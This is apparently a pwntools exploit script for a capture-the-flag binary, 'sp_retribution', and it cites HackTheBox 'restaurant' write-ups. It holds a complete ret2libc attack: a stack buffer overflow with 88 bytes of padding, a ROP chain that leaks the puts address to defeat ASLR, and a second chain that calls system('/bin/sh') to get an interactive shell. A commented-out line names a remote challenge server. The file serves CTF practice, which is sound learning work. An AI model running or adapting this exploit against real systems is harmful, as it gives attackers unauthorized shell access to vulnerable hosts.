#https://drive.google.com/file/d/1uGhFxeXSmu6Vo9hPfFnGY7EPKc0KRgaM/view
#https://shakuganz.com/2021/06/04/hackthebox-restaurant-write-up/
#https://fdlucifer.github.io/2021/05/08/pwn-restaurant/

#!/usr/bin/python3

'''
cyclic -l vaaa
84
84+4 == 88
'''

from pwn import *

context.arch = 'amd64'

elf = ELF('./sp_retribution')
libc = ELF('./glibc/libc.so.6')

padding = b'A'*(88)

io = process('./sp_retribution')
#ip, port = "68.183.47.198", 31876
#io = remote(ip, port)

io.sendlineafter('>> ','2')

rop = ROP(elf)


#payload1: leak aslr address of puts

rop.call(elf.plt['puts'], [next(elf.search(b''))])
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call((rop.find_gadget(['ret']))[0])	#!!Padding/16 bytes!

rop.call(elf.symbols['missile_launcher'])

payload1 = padding + rop.chain()
log.info(rop.dump())

io.sendlineafter('y = ', '[0x53e5854620fb399f]')
io.sendlineafter(' (y/n): ', payload1)

#io.recvuntil('\n')
#io.recvuntil('\n')

puts_addr = u64(io.recvuntil('\n').strip().ljust(8, b'\x00'))
log.info("Leaked server's libc address, puts(): "+hex(puts_addr))

server_libc_base = puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base

#payload2: get the shell
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + rop_libc.chain()
log.info(rop_libc.dump())

io.sendlineafter('y = ', '[0x53e5854620fb399f]')
io.sendlineafter(' (y/n): ', payload2)
io.interactive()

'''

'''
